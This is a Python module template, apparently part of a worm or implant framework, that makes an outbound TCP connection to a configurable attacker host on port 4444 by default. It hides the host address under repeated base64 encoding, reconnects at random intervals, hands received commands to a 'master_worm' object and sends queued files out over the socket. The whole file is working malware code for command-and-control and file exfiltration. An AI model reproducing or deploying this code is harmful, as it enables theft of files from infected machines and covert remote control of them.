#!name##RawTcpSend
#!itemType##module
#!fileType##PY_MOD
#!info##Send file over TCP socket
#!hiveType##PySM
#!lang##python
#!pyType##module
#!Var##RTC_ip##$IP_ADDR##Host ip address.##str
#!Var##RTC_port##4444##Host port number.##str
#!Var##RTC_encode##$SOCKET_ENCODE##Socket encode format##str

{% set RAW_TCP_SEND_ENCODE_COUNT = 8 %}


import base64
import socket
import threading
import queue
from time import sleep
from typing import Union
from random import randint

class RawTcpSend:
    MTYPES = "conn"
    STAND_TH = False
    def __init__(self, master_worm: object):
        self.worm = master_worm
        self.encode_format = "{{RTC_encode}}"
        self.raw_len = 1024
        self.addr = (self._getData({{pyTOOL.encodeBase64(RTC_ip, RAW_TCP_SEND_ENCODE_COUNT)}}).decode(self.encode_format), int(self._getData({{pyTOOL.encodeBase64(RTC_port, RAW_TCP_SEND_ENCODE_COUNT)}})))
        self._is_conn = False
        self.client = None
        self.pause_send = 0.2
        self.input_send_file = queue.Queue()
    

    @property
    def is_conn(self) -> bool:
        if not self.worm.FLAG_working:
            return False
        return self._is_conn
    
    def _getData(self, data: bytes) -> str:
        for _ in range({{RAW_TCP_SEND_ENCODE_COUNT}}):
            data = base64.b64decode(data)
        return data
    
    def processData(self, data: str) -> None:
        if not isinstance(data, str):
            try:
                data = data.decode(self.encode_format)
            except:
                pass
        self.worm.processData(data)
    
    def _connect(self) -> bool:
        self._is_conn = False
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.client.connect(self.addr)
            self._is_conn = True
            return True
        except:
            return False

    def _conn(self) -> None:
        while self.worm.FLAG_working:
            if self._connect():
                self.client.settimeout(3)
                self._recive()
            sleep(randint(2, 6))
    
    def _recive(self) -> None:
        msg = b""
        while self.is_conn:
            try:
                recv = self.client.recv(self.raw_len)
            except TimeoutError:
                continue
            except:
                break
            if recv:
                if len(recv) < self.raw_len:
                    msg += recv
                    self.processData(msg)
                    msg = b""
                else:
                    msg += recv
            else:
                if len(msg) > 0:
                    self.processData(msg)
                    msg = b""
                else:
                    break
        self._is_conn = False
    
    def _send_file(self, fpath: str, *args, **kwargs) -> None:
        try:
            with open(fpath, "rb") as file:
                self.client.sendfile(file, 0)
        except:
            pass
    
    def send_msg(self, msg: str, *args, **kwargs) -> None:
        pass

    def send_file(self, fpath: str, *args, **kwargs) -> None:
        self.input_send_file.put(fpath)
    
    def wait4conn(self, fpath: str) -> None:
        while not self.is_conn:
            sleep(5)
        self._send_file(fpath)


    def working(self) -> None:
        while self.worm.FLAG_working:
            too_send = self.input_send_file.get()
            sleep(self.pause_send)
            if self.is_conn:
                self._send_file(too_send)
            else:
                self.wait4conn(too_send)

    def start(self) -> None:
        work = threading.Thread(target=self.working, daemon=True)
        work.start()
        self._conn()
